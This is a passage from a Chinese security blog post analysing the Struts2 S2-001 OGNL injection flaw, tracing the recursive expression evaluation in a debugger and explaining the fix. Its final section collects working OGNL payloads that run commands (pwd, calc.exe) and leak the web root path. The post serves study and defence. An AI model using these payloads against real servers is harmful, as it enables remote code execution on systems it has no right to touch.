+<p>ComponentTagSupport 是一个抽象类。由于首先被解析的是一个 Struts2 Form 标签， org.apache.struts2.views 有一个与 Form标签对应的实体类，类名为 FormTag，是 ComponentTagSupport 的子类。虽然当前断点设置在 ComponentTagSupport 的 doStartTag 方法 上，其实是子类在调用父类方法，因为当前对象是 FormTag 对象：</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422201348356.png" alt="image-20240422201348356"></p>
+<p>接下来就是重点分析Form标签后面的<code>&lt;s:textfield</code>标签，这两个标签的具体写法如图</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422201508921.png" alt="image-20240422201508921"></p>
+<p>接下来我们别事后诸葛亮，先从doStartTag开始分析</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203820265.png" alt="image-20240422203820265"></p>
+<p>上述的component调用getBean函数，传入的参数为值栈对象、http请求对象、http相应对象，最后会返回一个TextField对象（这里暂时没看出什么可疑点）</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203306419.png" alt="image-20240422203306419"></p>
+<p>下面两幅图片是，getBean中具体的实现代码，也是没有可疑点</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203400327.png" alt="image-20240422203400327"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203500525.png" alt="image-20240422203500525"></p>
+<p><code>this.populateParams();</code>似乎就是单纯的设置属性id</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422204130042.png" alt="image-20240422204130042"></p>
+<p>随后调用start函数，不过这里恒为true</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203644684.png" alt="image-20240422203644684"></p>
+<p>接着进入if语句，调用usesBody，依旧恒为false，也就是这个doStartTag始终返回1</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422203659176.png" alt="image-20240422203659176"></p>
+<p>接着分析doEndTag，首先跟进函数end，这里继续调用了evaluateParams，继续跟进</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422204503242.png" alt="image-20240422204503242"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422204757333.png" alt="image-20240422204757333"></p>
+<p>这个函数前半部分逻辑清晰，就是添加相应的参数（键：键值）</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422204814987.png" alt="image-20240422204814987"></p>
+<p>接着分析下半部分，这里先展示了两个函数，一个返回恒为true，一个返回恒为String.class的类对象</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422204918103.png" alt="image-20240422204918103"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422205141413.png" alt="image-20240422205141413"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422211852940.png" alt="image-20240422211852940"></p>
+<p>根据上面两个函数，这意味着我们一定会进入第二个if语句，由于value的值为null，因此进入else语句，这里的name就是我们的username字符串</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422212504966.png" alt="image-20240422212504966"></p>
+<p>根据下面两个图片，我们知道alSyntax恒为true</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422205249909.png" alt="image-20240422205249909"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422205521314.png" alt="image-20240422205521314"></p>
+<p>这意味着，最终expr的值会是name值周围添加指定符号，构成ognl表达式</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422212546859.png" alt="image-20240422212546859"></p>
+<p>接着就是添加属性nameValue，这其中调用了findValue来寻找name也就是username字符串对应的值，跟进去看看</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422205919163.png" alt="image-20240422205919163"></p>
+<p>如上图，最终是一定会进入translateVariables方法，传入三个参数，%、expr以及值栈</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422212817439.png" alt="image-20240422212817439"></p>
+<p>这里继续调用了重载函数，无他，继续跟进，这里我认为就是关键的点了，分析一下while这里执行逻辑</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">translateVariables</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token keyword">open</span><span class="token punctuation">,</span> <span class="token class-name">String</span> expression<span class="token punctuation">,</span> <span class="token class-name">ValueStack</span> stack<span class="token punctuation">,</span> <span class="token class-name">Class</span> asType<span class="token punctuation">,</span> <span class="token class-name">ParsedValueEvaluator</span> evaluator<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Object</span> result <span class="token operator">=</span> expression<span class="token punctuation">;</span>
+
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">int</span> start <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token keyword">open</span> <span class="token operator">+</span> <span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> length <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> x <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">char</span> c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token operator">++</span>count<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">'}'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token operator">--</span>count<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">int</span> end <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> end <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token class-name">XWorkConverter</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertValue</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token class-name">String</span> <span class="token keyword">var</span> <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Object</span> o <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">findValue</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>evaluator <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                o <span class="token operator">=</span> evaluator<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token class-name">String</span> left <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> right <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> left <span class="token operator">+</span> o<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> o<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    result <span class="token operator">=</span> result <span class="token operator">+</span> right<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+
+                expression <span class="token operator">=</span> left <span class="token operator">+</span> o <span class="token operator">+</span> right<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                result <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
+                expression <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>charAt()</code>函数是用于获取字符串中指定索引位置的字符的方法。它属于<code>String</code>类的成员方法，可以通过字符串对象调用。</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422212941639.png" alt="image-20240422212941639"></p>
+<p>首先就是定义某些参数，这里代码能看懂，但是不知道具体含义是什么，看了文章发现是用来判断{与}符号数量是否一致，如果一致，那count最终就是0；（估计是为了符合ognl表达式要求</p>
+<p>这里最终会由于count=0跳出这个循环，来到下图，这里尝试返回username对应的值，赋值给对象o</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422213451835.png" alt="image-20240422213451835"></p>
+<p>这里我还没赋值，我们假设这里username值为%{1+1}，那o的值就不是null，然后这里的stringSet，由于string肯定为null（也就是left），最终的就会造成expression=%{1+1}</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422213822189.png" alt="image-20240422213822189"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422214506622.png" alt="image-20240422214506622"></p>
+<p>接着按照上图，跟进OgnlUtil.getValue，此时发现进入到Ognl.class的getValue，也就是处理Ognl表达式的类</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422215751380.png" alt="image-20240422215751380"></p>
+<p>这里利用tree参数（被强转为tree）之后调用getValue方法</p>
+<p>之后来到if语句，由于getTraceEvaluations恒为false，于是直接执行最下面的evaluateGetValueBody</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422220639514.png" alt="image-20240422220639514"></p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423103611402.png" alt="image-20240423103611402"></p>
+<p>如下图，先是设置上下文的当前对象以及当前节点，最终会调用getValueBdoy方法，继续跟进</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422221617471.png" alt="image-20240422221617471"></p>
+<p>接着就是ognl表达式的底层逻辑了，这里先不分析ognl表达式漏洞，我们只需要知道在getValueBdoy方法中，先是取出ognl表达式，这里就是<code>%{1+1}</code>得到第一个节点，这里显示result=1，接着进入for循环，继续遍历第二个节点，随后再取出来将得到的结果，调用add函数（逻辑似乎就是相加），相加得到result=2，也就是ognl表达式的解析执行</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240422222110743.png" alt="image-20240422222110743"></p>
+<p>至此struts2-001漏洞分析也就结束了</p>
+<h3 id="问题二">问题二</h3>
+<p>虽然分析了上述struts2-001漏洞，但其实也知道，根本上还是因为ognl表达式的注入漏洞，因此我认为还需要具体分析一下ognl表达式。</p>
+<p>借助一个demo，下断点跟进getValue</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423114021586.png" alt="image-20240423114021586"></p>
+<p>往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423114121075.png" alt="image-20240423114121075"></p>
+<p>到达下图，发现tree参数（被强转为Node）调用了getValue，传入的参数为当前ognl上下文以及root根对象，继续跟进</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423114331996.png" alt="image-20240423114331996"></p>
+<p>发现调用了evaluateGetValueBody，继续跟进</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423114502155.png" alt="image-20240423114502155"></p>
+<p>这里跟进到了getValueBody方法，这里看逻辑是对当前对象所拥有的节点进行的处理，继续跟进发现到了如下图所示的地方，对当前根节点调用getValue</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423114817312.png" alt="image-20240423114817312"></p>
+<p>跟进之后，又来到getValueBody（重载方法），跟进发现调用了callStaticMethod</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423115217367.png" alt="image-20240423115217367"></p>
+<p>如下图，可以看到这里调用了classForName获得当前className的class对象也就是java.lang.Runtime的类对象</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423115509644.png" alt="image-20240423115509644"></p>
+<p>继续跟进调用callStaticMethod重载函数，调用了getMethods来获取当前java.lang.Runtime类对象的getRuntime方法</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423115612856.png" alt="image-20240423115612856"></p>
+<p>继续跟进，调用了invokeMethod</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423162132259.png" alt="image-20240423162132259"></p>
+<p>最终是调用了invoke方法，执行getRuntime函数来实例化Runtime类</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423162151825.png" alt="image-20240423162151825"></p>
+<p>至此第一部分节点分析完成，接下来分析exec方法是如何传入进去的，也就是第二个节点</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423115914093.png" alt="image-20240423115914093"></p>
+<p>分析路径基本一样，只是调用的相关重载函数不一致</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423120025819.png" alt="image-20240423120025819"></p>
+<p>按照节点一的思路持续跟进，最终来到这里发现调用callMethod方法</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423120048851.png" alt="image-20240423120048851"></p>
+<p>进一步调用getMethods</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423120146543.png" alt="image-20240423120146543"></p>
+<p>无脑跟进，最终看到再次调用method.invoke，执行了Runtime实例的exec方法，并传入了calc参数，弹出计算器</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423121112655.png" alt="image-20240423121112655"></p>
+<p>至此，最终函数调用栈如下</p>
+<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">invokeMethod</span><span class="token punctuation">:</span>491<span class="token punctuation">,</span> OgnlRuntime <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">callAppropriateMethod</span><span class="token punctuation">:</span>785<span class="token punctuation">,</span> OgnlRuntime <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">callStaticMethod</span><span class="token punctuation">:</span>48<span class="token punctuation">,</span> ObjectMethodAccessor <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">callStaticMethod</span><span class="token punctuation">:</span>806<span class="token punctuation">,</span> OgnlRuntime <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValueBody</span><span class="token punctuation">:</span>67<span class="token punctuation">,</span> ASTStaticMethod <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">evaluateGetValueBody</span><span class="token punctuation">:</span>170<span class="token punctuation">,</span> SimpleNode <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValue</span><span class="token punctuation">:</span>210<span class="token punctuation">,</span> SimpleNode <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValueBody</span><span class="token punctuation">:</span>109<span class="token punctuation">,</span> ASTChain <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">evaluateGetValueBody</span><span class="token punctuation">:</span>170<span class="token punctuation">,</span> SimpleNode <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValue</span><span class="token punctuation">:</span>210<span class="token punctuation">,</span> SimpleNode <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValue</span><span class="token punctuation">:</span>333<span class="token punctuation">,</span> Ognl <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValue</span><span class="token punctuation">:</span>378<span class="token punctuation">,</span> Ognl <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">getValue</span><span class="token punctuation">:</span>357<span class="token punctuation">,</span> Ognl <span class="token punctuation">(</span>ognl<span class="token punctuation">)</span>
+<span class="token property">main</span><span class="token punctuation">:</span>13<span class="token punctuation">,</span> Test <span class="token punctuation">(</span>org.example<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。</p>
+<h1>0x05 漏洞修复</h1>
+<p>这里在分析修复前后的代码又遇到了小小问题，发现对漏洞产生还是有点不清楚，但继续重新调试终于明白</p>
+<p>附上修复和修复前的代码（借个图）</p>
+<p><img src="/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/image-20240423113444173.png" alt="image-20240423113444173"></p>
+<p>可以看到上述增加了一个if判断，根据文章所说，这里是 <strong>Ognl</strong> 递归解析次数的判断，默认情况下仅解析第一层。</p>
+<p>对于这种修复解释，我们先看一下漏洞执行逻辑，首先是解析执行%{username}，是一个ognl表达式，会进行ognl表达式解析执行，最终就是来获取username的值，也就是最终成为%{1+1}，因为我们设置的username就是%{1+1}，由于修复前的代码用的是while循环，因此又会去递归解析这个%{1+1}，又认为是ognl表达式，最终解析为2。</p>
+<p>但修复后的进行了判断：递归解析次数。因此如果还是上述情况，会在解析%{1+1}的时候，判断次数上限，退出while循环，也就不会被执行了。</p>
+<h2 id="总结">总结</h2>
+<p>经过上述漏洞的分析，可以看到Struts2-001漏洞点，就在于对用户输入的数据没有做出合理判断，导致在解析ognl表达式的时候，在其中的while循环，递归解析了ognl表达式，导致任意代码执行。</p>
+<h1>0x06 Poc采集</h1>
+<p>回显poc</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span><span class="token punctuation">{</span>#a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"pwd"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#b<span class="token operator">=</span>#a<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span>#b<span class="token punctuation">)</span><span class="token punctuation">,</span>#d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span>#c<span class="token punctuation">)</span><span class="token punctuation">,</span>#e<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">,</span>#d<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>调试poc：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>获取web路径</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">%</span><span class="token punctuation">{</span>
+#req<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+#response<span class="token operator">=</span>#context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+#response<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>#req<span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+#response<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+#response<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1>0x07 参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16197395.html">Java安全之S2-001漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">OGNL表达式注入漏洞总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://mengsec.com/2019/10/29/Java-Web-S2-001/#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">Java Web安全入门——S2-001漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/624053727">Struts2-001漏洞分析（CVE-2007-4556）</a>–环境搭建可参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#%E5%80%BC%E6%A0%88%E7%9A%84%E4%BD%9C%E7%94%A8">OGNL表达式注入漏洞总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BStruts2-001.md">https://github.com/Mochazz/Struts2-Vuln/blob/master/Article/Java代码审计之Struts2-001.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://lanvnal.com/2020/12/15/s2-001-lou-dong-fen-xi/#toc-heading-6">JavaWeb安全入门之 S2-001漏洞分析</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/">http://hybcx.xyz/2024/04/15/java-fan-xu-lie-hua-zhi-s2-001/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">hybcx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
